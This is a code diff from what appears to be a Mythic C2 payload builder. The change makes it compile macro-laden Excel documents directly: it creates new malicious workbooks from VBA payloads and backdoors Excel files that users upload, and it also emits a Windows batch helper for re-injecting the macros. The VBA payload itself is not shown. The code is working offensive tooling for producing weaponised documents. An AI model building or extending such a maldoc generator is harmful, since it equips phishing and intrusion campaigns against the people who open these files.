@@ -3043,27 +3043,46 @@ static size_t key_len = sizeof(key);
                     elif maldoc_type == "Create New":
                         maldoc_fmt = (self.get_parameter("0.9p MalDoc Output Format") or "xlsm").lower()
 
-                        # Always export the .bas so the operator can re-inject manually
                         from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin as _MDP
                         _plugin = _MDP()
+
+                        # Export .bas for manual re-injection if needed
                         bas_output = payload_dir / f"{doc_name}_payload.bas"
                         _plugin.export_vba_as_bas(vba_code=vba_code, output_path=str(bas_output), module_name=doc_name)
 
-                        # All formats deferred via helper on Windows host - COM injection required
+                        # Compile the Excel file directly using the template
                         excel_output = payload_dir / f"{doc_name}.{maldoc_fmt}"
+                        template_path = _plugin._resolve_template_path(excel_output)
+
+                        if template_path and template_path.exists():
+                            _plugin.create_new_excel_with_payload(
+                                output_path=excel_output,
+                                vba_code=vba_code,
+                                document_name=doc_name,
+                                template_path=template_path,
+                            )
+                            success_msg = f"[+] Compiled {excel_output.name} from {template_path.name} template.\n"
+                            output += f"[+] Created {maldoc_fmt.upper()}: {excel_output.name}\n"
+                        else:
+                            # Fallback: create from scratch via openpyxl
+                            _plugin.create_new_excel_with_payload(
+                                output_path=excel_output,
+                                vba_code=vba_code,
+                                document_name=doc_name,
+                            )
+                            success_msg = f"[+] Created {excel_output.name} (no template found, built from scratch).\n"
+                            output += f"[+] Created {maldoc_fmt.upper()}: {excel_output.name}\n"
+
+                        # Also emit build_maldoc.bat for Windows-side COM re-injection
                         bat_lines = [
                             "@echo off",
-                            f"REM Inject VBA into {maldoc_fmt.upper()} via erebus_helper (run on Windows).",
+                            f"REM Re-inject VBA into {maldoc_fmt.upper()} via erebus_helper (run on Windows for full COM support).",
                             f'python erebus_helper.py {maldoc_fmt} --bas-file "{bas_output.name}" --output "{excel_output.name}" --module-name "{doc_name}"',
                             "echo MalDoc created: %errorlevel%",
                         ]
                         bat_path = payload_dir / "build_maldoc.bat"
                         bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")
-                        success_msg = (
-                            f"VBA exported to {bas_output.name}. "
-                            f"Run build_maldoc.bat on a Windows host to produce {excel_output.name}."
-                        )
-                        output += f"[+] Generated build_maldoc.bat for Windows-side {maldoc_fmt.upper()} injection\n"
+                        output += f"[*] build_maldoc.bat included for optional Windows-side COM re-injection\n"
 
                     else:  # Backdoor Existing
                         maldoc_fmt = (self.get_parameter("0.9p MalDoc Output Format") or "xlsm").lower()
@@ -3089,33 +3108,42 @@ static size_t key_len = sizeof(key);
                         if file_name_resp.Success and len(file_name_resp.Files) > 0:
                             original_filename = file_name_resp.Files[0].Filename
 
-                        # Save the uploaded file to the payload dir for the operator to use
+                        # Keep the uploaded source file in the payload directory
                         source_excel_name = f"{Path(original_filename).stem}_source{Path(original_filename).suffix}"
                         source_excel_path = payload_dir / source_excel_name
                         source_excel_path.write_bytes(file_resp.Content)
 
-                        # Always export .bas
                         from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin as _MDP
                         _plugin = _MDP()
+
+                        # Export .bas for manual re-injection if needed
                         bas_output = payload_dir / f"{doc_name}_payload.bas"
                         _plugin.export_vba_as_bas(vba_code=vba_code, output_path=str(bas_output), module_name=doc_name)
 
-                        # All formats deferred via helper on Windows host - COM injection required
+                        # Compile the backdoored Excel directly
                         output_name = f"{Path(original_filename).stem}_backdoored.{maldoc_fmt}"
                         excel_output = payload_dir / output_name
+                        _plugin.backdoor_excel_document(
+                            source_path=source_excel_path,
+                            output_path=excel_output,
+                            vba_code=vba_code,
+                        )
+                        success_msg = (
+                            f"[+] Backdoored {original_filename} -> {excel_output.name}\n"
+                            f"[*] Source file kept at {source_excel_name}\n"
+                        )
+                        output += f"[+] Created backdoored {maldoc_fmt.upper()}: {excel_output.name}\n"
+
+                        # Also emit build_maldoc.bat for Windows-side COM re-injection
                         bat_lines = [
                             "@echo off",
-                            f"REM Backdoor existing Excel file with VBA via erebus_helper (run on Windows).",
+                            f"REM Re-inject VBA into {maldoc_fmt.upper()} via erebus_helper (run on Windows for full COM support).",
                             f'python erebus_helper.py {maldoc_fmt} --bas-file "{bas_output.name}" --source-excel "{source_excel_name}" --output "{excel_output.name}" --module-name "{doc_name}"',
                             "echo MalDoc created: %errorlevel%",
                         ]
                         bat_path = payload_dir / "build_maldoc.bat"
                         bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")
-                        success_msg = (
-                            f"VBA exported to {bas_output.name}. "
-                            f"Run build_maldoc.bat on a Windows host to produce {excel_output.name}."
-                        )
-                        output += f"[+] Generated build_maldoc.bat for Windows-side {maldoc_fmt.upper()} backdooring\n"
+                        output += f"[*] build_maldoc.bat included for optional Windows-side COM re-injection\n"
 
                     await SendMythicRPCPayloadUpdatebuildStep(
                         MythicRPCPayloadUpdateBuildStepMessage(
